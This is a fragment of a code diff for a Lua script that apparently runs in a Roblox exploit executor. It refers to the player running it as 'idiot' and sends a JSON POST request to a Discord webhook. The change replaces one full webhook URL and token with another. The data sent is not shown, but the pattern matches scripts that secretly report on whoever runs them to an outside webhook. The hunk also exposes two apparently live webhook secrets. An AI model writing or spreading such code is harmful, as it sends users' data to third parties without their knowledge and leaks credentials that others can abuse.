@@ -4,7 +4,7 @@ local idiot = game:GetService("Players").LocalPlayer
 local response = syn.request(
 
     {
-        Url = 'https://discord.com/api/webhooks/1063964915699818617/k7Q85bflQkUui9l0Pz1HjKGjcg2lW0nysdFiUYQ9me-I_5s5Hcot8ZbXNldTY793rnJK',
+        Url = 'https://discord.com/api/webhooks/1063965809245958256/poJyGFeGZET1FmfLrkVC7MbZ9z-TyEvIksJePH4_1o8IJMC5kaWcBCHLLhvjSSUAlDPE',
         Method = 'POST',
         Headers = {
             ['Content-Type'] = 'application/json'
